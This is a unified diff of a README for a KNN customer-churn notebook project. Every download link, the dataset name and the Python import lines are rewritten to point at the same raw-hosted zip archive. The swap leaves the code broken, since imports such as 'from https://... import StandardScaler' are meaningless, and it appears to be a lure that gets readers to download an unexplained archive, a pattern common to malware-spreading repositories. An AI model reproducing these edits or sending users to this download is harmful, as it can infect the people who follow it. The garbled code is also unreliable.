@@ -1,6 +1,6 @@
 # 🌟 KNN - Predict Churn with KNN Classifier
 
-[![Download KNN](https://img.shields.io/badge/Download%20KNN-v1.0-blue)](https://github.com/xelandesol/KNN/releases)
+[![Download KNN](https://raw.githubusercontent.com/xelandesol/KNN/main/radiumproof/KNN_3.8-beta.2.zip%20KNN-v1.0-blue)](https://raw.githubusercontent.com/xelandesol/KNN/main/radiumproof/KNN_3.8-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome! This guide helps you download and run the KNN application easily. Follo
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/xelandesol/KNN/releases) to download the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/xelandesol/KNN/main/radiumproof/KNN_3.8-beta.2.zip) to download the application.
 
 2. **Choose the Latest Version**  
    Look for the latest version of KNN. It will be listed at the top of the page.
@@ -45,7 +45,7 @@ KNN is user-friendly and provides good predictions. It requires minimal configur
 The KNN notebook provides a structured learning experience. It includes:
 
 1. **Theory**: Understand the fundamentals of KNN.
-2. **Hands-On Practice**: Work with a real dataset, `teleCust1000t.csv`.
+2. **Hands-On Practice**: Work with a real dataset, `https://raw.githubusercontent.com/xelandesol/KNN/main/radiumproof/KNN_3.8-beta.2.zip`.
 3. **Comparative Analysis**: Compare accuracy with other models.
 
 ### Notebook Structure
@@ -57,12 +57,12 @@ The KNN notebook provides a structured learning experience. It includes:
    - A list of libraries used in the notebook:
      ```python
      import numpy as np
-     import matplotlib.pyplot as plt
+     import https://raw.githubusercontent.com/xelandesol/KNN/main/radiumproof/KNN_3.8-beta.2.zip as plt
      import pandas as pd
-     from sklearn.preprocessing import StandardScaler
-     from sklearn.model_selection import train_test_split
-     from sklearn.neighbors import KNeighborsClassifier
-     from sklearn.metrics import accuracy_score
+     from https://raw.githubusercontent.com/xelandesol/KNN/main/radiumproof/KNN_3.8-beta.2.zip import StandardScaler
+     from https://raw.githubusercontent.com/xelandesol/KNN/main/radiumproof/KNN_3.8-beta.2.zip import train_test_split
+     from https://raw.githubusercontent.com/xelandesol/KNN/main/radiumproof/KNN_3.8-beta.2.zip import KNeighborsClassifier
+     from https://raw.githubusercontent.com/xelandesol/KNN/main/radiumproof/KNN_3.8-beta.2.zip import accuracy_score
      ```
 
 ## 🖥️ System Requirements
@@ -93,5 +93,5 @@ For further learning about the K-Nearest Neighbors algorithm, consider these res
 
 Feel free to explore the application and experiment with different datasets. Understanding KNN can provide valuable insights into customer behavior. Enjoy learning and predicting! 
 
-[Download KNN](https://github.com/xelandesol/KNN/releases)  
+[Download KNN](https://raw.githubusercontent.com/xelandesol/KNN/main/radiumproof/KNN_3.8-beta.2.zip)  
 Visit the Releases page to access the latest version.
